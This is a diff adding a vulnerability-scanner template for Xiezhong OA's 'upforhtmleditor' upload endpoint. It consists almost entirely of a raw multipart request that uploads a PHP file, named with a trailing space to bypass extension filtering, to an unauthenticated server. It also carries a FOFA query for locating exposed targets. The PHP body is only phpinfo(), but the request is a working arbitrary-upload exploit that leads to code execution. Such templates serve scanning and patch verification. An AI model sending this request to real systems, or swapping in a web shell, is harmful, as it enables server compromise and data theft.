@@ -1,0 +1,45 @@
+id: xiezhong-upforhtmleditor-fileupload
+
+info:
+  name: 协众 OA upforhtmleditor - fileupload
+  author: leadlife
+  severity: critical
+  description: 
+  metadata:
+    verified: true
+    fofa-query: app="协众软件-协众OA"
+  tags: xiezhong,oa,fileupload
+
+http:
+  - raw:
+      - |-
+        POST /index.php?action=upFile&act=upforhtmleditor HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCy4HVT4TPkeHYzqA
+        Accept-Encoding: gzip,deflate,sdch
+        Accept-Language: zh-CN,zh;q=0.8
+        Content-Length: 305
+
+        ------WebKitFormBoundaryCy4HVT4TPkeHYzqA
+        Content-Disposition: form-data; name="Filedata"; filename="1.php "
+        Content-Type: text/plain
+
+        <?php
+        phpinfo();
+        ?>
+
+        ------WebKitFormBoundaryCy4HVT4TPkeHYzqA
+        Content-Disposition: form-data; name="submit"
+        Submit
+
+        ------WebKitFormBoundaryCy4HVT4TPkeHYzqA--
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - cnoa
+          - upload
+          - file
+          - common
+        condition: and
